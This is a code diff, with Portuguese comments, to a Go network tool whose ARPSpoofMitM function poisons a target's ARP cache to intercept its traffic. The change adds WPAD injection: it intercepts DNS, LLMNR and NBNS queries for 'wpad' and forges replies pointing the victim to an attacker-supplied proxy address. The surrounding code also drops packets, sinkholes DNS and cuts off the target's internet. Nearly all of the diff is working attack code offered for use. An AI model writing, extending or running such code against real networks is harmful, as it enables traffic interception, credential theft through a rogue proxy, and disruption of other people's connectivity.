@@ -456,8 +456,8 @@ func (s *SnifferService) SniffNetwork(ctx context.Context) error {
 // Isso força o tráfego do alvo a passar pela nossa máquina, permitindo
 // a captura de TTL, SNI, DNS e outros dados mesmo de máquinas em Modo Furtivo.
 // O parâmetro showLogs controla a exibição em tempo real dos logs de interceptação no terminal.
-// O parâmetro isBlocked, quando ativo, diz ao sniffer para destruir os pacotes e bloquear a internet do alvo.
-func (s *SnifferService) ARPSpoofMitM(ctx context.Context, targetIP, manualMAC string, showLogs *atomic.Bool, showTracer *atomic.Bool, isBlocked *atomic.Bool, rstDropPercent *atomic.Int32, isLagged *atomic.Bool, isDNSSinkhole *atomic.Bool, isICMPUnreachable *atomic.Bool) error {
+// O parâmetro wpadFileInjection e wpadServerAddr controlam a injeção de WPAD para auto-proxy.
+func (s *SnifferService) ARPSpoofMitM(ctx context.Context, targetIP, manualMAC string, showLogs *atomic.Bool, showTracer *atomic.Bool, isBlocked *atomic.Bool, rstDropPercent *atomic.Int32, isLagged *atomic.Bool, isDNSSinkhole *atomic.Bool, isICMPUnreachable *atomic.Bool, wpadFileInjection *atomic.Bool, wpadServerAddr string) error {
 	devices, err := pcap.FindAllDevs()
 	if err != nil {
 		log.Println("  [-] Erro ao buscar interfaces:", err)
@@ -652,8 +652,61 @@ func (s *SnifferService) ARPSpoofMitM(ctx context.Context, targetIP, manualMAC s
 								if dstPort == 53 {
 									pktCopy := make([]byte, len(data))
 									copy(pktCopy, data)
-									s.forgeDNSResponse(captureHandle, pktCopy, myMAC, targetMAC)
+									s.forgeDNSResponse(captureHandle, pktCopy, myMAC, targetMAC, "127.0.0.1")
 									continue // Não encaminha a query DNS real
+								}
+							}
+						}
+					}
+
+					// WPAD File Injection — intercepta consultas DNS para "wpad" ou "wpad.*" e forja resposta
+					if wpadFileInjection != nil && wpadFileInjection.Load() {
+						if len(data) >= 34 && data[12] == 0x08 && data[13] == 0x00 && data[23] == 17 {
+							ihl := int(data[14]&0x0F) * 4
+							udpStart := 14 + ihl
+							if len(data) >= udpStart+4 {
+								dstPort := uint16(data[udpStart+2])<<8 | uint16(data[udpStart+3])
+								// Intercepta DNS (53), LLMNR (5355) e NBNS (137)
+								if dstPort == 53 || dstPort == 5355 || dstPort == 137 {
+									pkt := gopacket.NewPacket(data, layers.LayerTypeEthernet, gopacket.Default)
+									
+									var dns *layers.DNS
+									dnsLayer := pkt.Layer(layers.LayerTypeDNS)
+									if dnsLayer != nil {
+										dns, _ = dnsLayer.(*layers.DNS)
+									} else {
+										// Força o decode do Payload UDP porque gopacket não faz decode automático de DNS em portas não-padrão
+										if udpLayer := pkt.Layer(layers.LayerTypeUDP); udpLayer != nil {
+											udp, _ := udpLayer.(*layers.UDP)
+											var manualDNS layers.DNS
+											if err := manualDNS.DecodeFromBytes(udp.Payload, gopacket.NilDecodeFeedback); err == nil {
+												dns = &manualDNS
+											}
+										}
+									}
+
+									if dns != nil && dns.OpCode == layers.DNSOpCodeQuery && len(dns.Questions) > 0 {
+										// Em pacotes NBNS, o nome vem num formato peculiar (ex: WPAD<space><space>...).
+										// Limpamos e normalizamos o domínio
+										queryName := strings.TrimSpace(strings.ToLower(string(dns.Questions[0].Name)))
+										queryName = strings.ReplaceAll(queryName, "\x00", "")
+
+										if strings.HasPrefix(queryName, "wpad") {
+											pktCopy := make([]byte, len(data))
+											copy(pktCopy, data)
+											s.forgeDNSResponse(captureHandle, pktCopy, myMAC, targetMAC, wpadServerAddr)
+											if showLogs != nil && showLogs.Load() {
+												protocol := "DNS"
+												if dstPort == 5355 {
+													protocol = "LLMNR"
+												} else if dstPort == 137 {
+													protocol = "NBNS"
+												}
+												fmt.Printf("  [MitM] Interceptada query WPAD via %s (%s), injetando IP: %s\n", protocol, queryName, wpadServerAddr)
+											}
+											continue // Não encaminha a query LLMNR/NBNS para o roteador
+										}
+									}
 								}
 							}
 						}
